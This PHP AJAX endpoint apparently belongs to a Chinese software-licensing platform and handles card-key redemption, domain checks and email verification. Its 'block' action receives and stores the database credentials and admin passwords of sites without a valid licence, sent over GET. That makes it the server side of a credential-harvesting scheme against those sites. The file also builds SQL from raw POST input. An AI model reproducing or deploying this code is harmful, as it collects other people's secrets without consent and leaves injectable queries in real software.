<?php
$mod='blank';
include("./includes/common.php");
@header("content-Type:text/json;charset=utf-8");
if(isset($_GET['act'])) {
	$act = $_GET['act'];
} else {
	$act = $_POST['act'];
}
ob_clean();
//清除BOOM
switch($act) {
	case 'check_dl':
	$qq=daddslashes($_GET['qq']?$_GET['qq']:$_POST['qq']);
	$row=$DB->get_row("SELECT * FROM `auth_daili` WHERE qq='$qq' limit 1");
	if($row['qq'] != '') {
		$status = array('code' => 0 , 'msg' => '');
	} else {
		$status = array('code' => 1 , 'msg' => '');
	}
	exit(json_encode($status));
	break;
	case 'check_url':
	$url=daddslashes($_GET['url']?$_GET['url']:$_POST['url']);
	if(checkauth2($url)) {
		$status = array('code' => 0 , 'msg' => '');
	} else {
		$status = array('code' => 1 , 'msg' => '');
	}
	exit(json_encode($status));
	break;
	case 'kmsq';
	//卡密购买
	if(isset($_POST['qq']) && isset($_POST['url']) && isset($_POST['km'])) {
		$qq=daddslashes($_POST['qq']);
		$url=daddslashes($_POST['url']);
		$km = daddslashes($_POST['km']);
		if(!$qq or !$url or !$km) {
			exit('{"code":-1,"msg":"所有信息不能为空哟！"}');
		}
		$kami=$DB->get_row("select * from auth_km where km='" . $km . "' limit 1");
		if(!$kami) {
			exit('{"code":-1,"msg":"授权失败,请检查卡密格式是否正确！"}');
		}
		if($kami["state"] == 1) {
			exit('{"code":-1,"msg":"当前卡密已被使用！"}');
		}
		$row=$DB->get_row("SELECT * FROM auth_site WHERE uid='{$qq}' limit 1");
		if($row!='' && $conf['ipauth']==0) {
			exit('{"code":-1,"msg":"该QQ已存在授权！"}');
		}
		$row1=$DB->get_row("SELECT * FROM auth_site WHERE 1 order by sign desc limit 1");
		$sign=$row1['sign']+1;
		$authcode=md5(random(32).$qq);
		$row2=$DB->get_row("SELECT * FROM auth_site WHERE authcode='{$authcode}' limit 1");
		if($row!='') {
			exit('{"code":-1,"msg":"请返回重新操作！"}');
		}
		$url=str_replace('，',',',$url);
		$url_arr=explode(',',$url);
		foreach($url_arr as $val) {
			$sql="insert into `auth_site` (`uid`,`url`,`date`,`authcode`,`active`,`sign`) values ('".$qq."','".trim($val)."','".$date."','".$authcode."','1','".$sign."')";
			$DB->query($sql);
		}
		$city=get_ip_city($clientip);
		$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".$user."','新增授权','".$date."','".$city."','".$qq."|".$url."')");
		$state = '1';
		$sql="update `auth_km` set `state` ='{$state}' where `km`='{$_POST['km']}'";
		$DB->query($sql);
		$email = $qq . '@qq.com';
        $sub = ''.$conf['title'].' - 添加授权';
        $msg = '授权域名 : ' . $url . ' <br>授权 Q Q : ' . $qq . ' <br>授权代码 : ' . $authcode . '';
        send_mail($email, $sub, $msg);
		exit('{"code":1,"msg":"恭喜您授权成功！"}');
	}
	break;
	case 'downfile';
	//下载验证
	if (isset($_POST['qq'])) {
		$qq = daddslashes($_POST['qq']);
		if(isset($_SESSION['mail_find']) && $_SESSION['mail_find']>time()-$conf['mail_time']) {
			exit('{"code":-1,"msg":"请勿频繁操作<code>'.($conf['mail_time']/60).'分钟</code>后在进行操作，如果未收到请尝试在垃圾邮件箱寻找！"}');
		}
		$row = $DB->get_row("SELECT * FROM auth_site WHERE uid='{$qq}' limit 1");
		if ($row == '') {
			exit('{"code":-1,"msg":"授权平台不存在该QQ！"}');
		}
		if ($row['active'] == 0) {
			exit('{"code":-1,"msg":"此QQ的授权已被封禁！"}');
		}
		$email = $qq . '@qq.com';
		$sub = ''.$conf['title'].' - 下载验证';
		$code = rand(1111, 9999);
		setcookie('authcode', md5($code), time() + 60 * 1);
		$msg = '验证码：'.$code.'<br>PS：本次验证信息60秒内有效！';
		$result = send_mail($email, $sub, $msg);
		if ($result) {
			$_SESSION['mail_find']=time();
			exit('{"code":1,"msg":"邮件发送成功，请注意查收！"}');
		} else {
			exit('{"code":-1,"msg":"邮件发送失败，请重试！"}');
		}
	}
	break;
	case 'block';
	if($conf['addblock']==1) {
		$url = daddslashes($_GET['url']);
		$user = daddslashes($_GET['user']);
		$pwd = daddslashes($_GET['pwd']);
		$dbname = daddslashes($_GET['dbname']);
		$authcode = daddslashes($_GET['authcode']);
		$admin_user = daddslashes($_GET['admin_user']);
		$admin_pass = daddslashes($_GET['admin_pass']);
		$row=$DB->get_row("SELECT * FROM auth_block WHERE url='{$url}' limit 1");
		if(!$url or !$user or !$pwd or !$dbname) {
			exit('{"code":-1,"msg":"检测提交信息不完整！"}');
		}
		if(checkauth2($url)) {
			exit('{"code":-1,"msg":"该域名是正版授权！"}');
		}
		if ($row) {
			if ($url!=$row['url'] || $user!=$row['user'] || $pwd!=$row['pwd'] || $dbname!=$row['dbname'] || $authcode!=$row['authcode'] || $admin_user!=$row['admin_user'] || $admin_pass!=$row['admin_pass'] ) {
				$sql="update `auth_block` set `url` ='{$url}', `user` ='{$user}', `pwd` ='{$pwd}', `dbname` ='{$dbname}', `authcode` ='{$authcode}', `admin_user` ='{$admin_user}', `admin_pass` ='{$admin_pass}' where `uid`='{$row['uid']}'";
				if($DB->query($sql)) {
					exit('{"code":1,"msg":"更新数据成功！"}');
				} else {
					exit('{"code":-1,"msg":"更新数据失败！'.$DB->error().'"}');
				}
			} else {
				exit('{"code":-1,"msg":"已是最新数据！"}');
			}
		} else {
			if($DB->query("insert into `auth_block` (`uid`, `url`, `user`, `pwd`, `dbname`, `authcode`, `admin_user`, `admin_pass`, `date`) values ('".$uid."', '".$url."', '".$user."', '".$pwd."', '".$dbname."', '".$authcode."', '".$admin_user."', '".$admin_pass."', '".$date."')")) {
				exit('{"code":1,"msg":"数据导入成功！"}');
			} else {
				exit('{"code":-1,"msg":"数据导入失败！'.$DB->error().'"}');
			}
		}
	} else {
		exit('{"code":-4,"msg":"该功能已关闭！"}');
	}
	break;
	case 'subscribe':
	@header('Content-Type: application/json; charset=UTF-8');
		$email=daddslashes(htmlspecialchars(strip_tags(trim($_POST['email']))));
		if (conf('Vaptcha_Open') == 1) {
			$token = $_POST['token'];
		}
		if ($email=='') {
			exit('{"code":-1,"msg":"请确保每项都不为空"}');
		}
		if (conf('Vaptcha_Open') == 1 && $token=='') {
			exit('{"code":-1,"msg":"请先完成人机验证"}');
		}else{
		    if(conf('Mail_Name') == '' || conf('Mail_Pwd') == ''){exit('{"code":-1,"msg":"请先配置邮箱信息"}');}
    		$admins=$DB->query("SELECT * FROM nteam_admin WHERE id=1");
    		while($admin = $admins->fetch()){
    			$email = $admin['adminQq'].'@qq.com';
    		}
    		$sub = '官网有需要订阅的小伙伴哦~~';
    		$msg = "邮箱：".$email;
    		$result = send_mail($email, $sub, $msg);
    		if($result===true){// 发送邮件
    			$email = $_POST['email'];
    			$sub = '成功订阅~~';
    			$msg = '感谢订阅'.conf('Name').'新闻！';
    			$result = send_mail($email, $sub, $msg);
    			if ($result===true) {
    				exit('{"code":1,"msg":"订阅成功！"}');
    			}else{
    				exit('{"code":-1,"msg":"订阅失败！"}');
    			}
    		}
		}
		break;
			case 'contact':
		$name=daddslashes(htmlspecialchars(strip_tags(trim($_POST['name']))));
		$email=daddslashes(htmlspecialchars(strip_tags(trim($_POST['email']))));
		$subject=daddslashes(htmlspecialchars(strip_tags(trim($_POST['subject']))));
		$message=daddslashes(htmlspecialchars(strip_tags(trim($_POST['message']))));
		if ($name==null || $email==null || $subject==null || $message==null) {
			exit('{"code":-1,"msg":"请确保每项都不为空"}');
		}
	    if(conf('Mail_Name') == '' || conf('Mail_Pwd') == ''){exit('{"code":-1,"msg":"请先配置邮箱信息"}');}
		$admins=$DB->query("SELECT * FROM nteam_admin WHERE id=1");
		while($admin = $admins->fetch()){
			$email = $admin['adminQq'].'@qq.com';
		}
		$sub = '网页收到新留言啦~~';
		$msg = "姓名：".$name."
		        邮件：".$email."
		        主题：".$subject."
		        内容：".$message;      // 邮件正文
		$result = send_mail($email, $sub, $msg);
		if($result===true){// 发送邮件
			if ($DB->exec("INSERT INTO `nteam_leave_messages` (`name`,`email`,`subject`,`message`,`intime`) values ('".$name."','".$email."','".$subject."','".$message."','".$date."')")) {
				echo 'OK';
			};
		}else{
			file_put_contents('mail.log',$result);
			exit('{"code":-1,"msg":"留言发送失败"}');
		}
		break;
	
}
?>